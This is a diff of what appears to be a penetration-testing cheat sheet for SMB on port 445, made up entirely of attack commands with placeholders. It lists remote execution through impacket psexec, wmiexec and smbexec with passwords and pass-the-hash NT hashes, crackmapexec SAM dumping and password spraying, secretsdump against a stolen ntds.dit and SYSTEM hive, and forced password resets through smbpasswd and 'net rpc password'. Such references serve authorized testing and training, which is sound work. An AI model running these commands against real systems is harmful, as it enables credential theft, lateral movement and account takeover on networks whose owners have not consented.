@@ -1,21 +1,30 @@
 ### Port 445 (SMB)
 smbclient -L //$rhost/ -U $domain/$user
 nxc smb $rhost -u '$user' -p '$password' --users
-impacket-wmiexec administrator@$rhost -hashes Hash-value
+crackmapexec smb $rhost -u $user -p '$password' --loggedon-users
 impacket-secretsdump $shortdomain/$user@$rhost
-smbpasswd -r $rhost -U $user
+crackmapexec smb $rhost -u $user -p '$password' --sam
+crackmapexec smb $rhost -u $user -p '$password' -x 'whoami' --exec-method smbexec
+impacket-psexec $user:$password@$rhost
+impacket-wmiexec $user:$password@$rhost
+impacket-smbexec $user:$password@$rhost
+crackmapexec smb $rhost -u $user -p $password
+impacket-psexec $shortdomain/$user:$password@$rhost
+impacket-wmiexec $shortdomain/$user:$password@$rhost
+impacket-smbexec $shortdomain/$user:$password@$rhost
+crackmapexec smb $rhost -u $user -p $password
 impacket-psexec LADMIN@$rhost
-impacket-psexec administrator@$rhost -hashes :Hash-value
-impacket-smbexec administrator@$rhost -hashes :Hash-value
-crackmapexec smb $rhost -u Administrator -H Hash-value
-crackmapexec smb $rhost -u users.txt -p passwords.txt -d $domain --continue-on-success
-crackmapexec smb 192.168.1.0/24 -u administrator -p '$password' --loggedon-users
-crackmapexec smb $rhost -u administrator -p '$password' --sam
-crackmapexec smb $rhost -u Administrator -p '$password' -x 'whoami' --exec-method smbexec
-impacket-psexec $shortdomain/$user@$rhost
-impacket-psexec -hashes :hash-here $shortdomain/$user@$rhost
-Try> impacket-secretsdump -ntds AD-stolen/ntds.dit -system reg-stolen/SYSTEM LOCAL
-Try> impacket-secretsdump -ntds AD-stolen/ntds.dit -system SYSTEM LOCAL
+Edit > impacket-psexec -hashes LMhash:NThash-here $user@$rhost
+Edit > impacket-wmiexec -hashes LMhash:NThash-here $user@$rhost
+Edit > impacket-smbexec -hashes LMhash:NThash-here $user@$rhost
+Edit > impacket-psexec -hashes LMhash:NThash-here $shortdomain/$user@$rhost
+Edit > impacket-wmiexec -hashes LMhash:NThash-here $shortdomain/$user@$rhost
+Edit > impacket-smbexec -hashes LMhash:NThash-here $shortdomain/$user@$rhost
+Edit > crackmapexec smb $rhost -u users.txt -p '$password' --local-auth --continue-on-success
+Edit > crackmapexec smb $rhost -u users.txt -p passwords.txt -d $domain --continue-on-success
+Try > impacket-secretsdump -ntds AD-stolen/ntds.dit -system reg-stolen/SYSTEM LOCAL
+Try > impacket-secretsdump -ntds AD-stolen/ntds.dit -system SYSTEM LOCAL
+smbpasswd -r $rhost -U $user # change password
 net rpc password "TargetUser" "NewP@ssw0rd" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Here"
 net rpc password "TargetUser" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Here"
 
